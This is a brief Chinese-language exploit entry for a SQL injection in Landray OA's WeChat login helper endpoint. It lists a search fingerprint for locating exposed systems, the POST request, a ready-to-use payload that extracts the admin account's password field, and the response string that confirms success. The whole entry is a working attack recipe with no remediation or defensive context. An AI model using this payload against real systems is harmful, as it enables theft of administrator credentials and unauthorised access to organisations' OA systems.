# 蓝凌OAwechatloginhelpersql注入漏洞

蓝凌OAwechatloginhelper ｜ SQL注入 ｜ —
- **指纹**：`app="Landray-OA系统"`
- **请求**：`POST /third/wechat/wechatLoginHelper.do HTTP/1.1`

**Payload**
```
method=edit&uid=1'and+(SELECT+'password-is:'%2BfdPassword%2B'----'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin')=1+and+'1'='1
```
- **响应特征**：200 password-is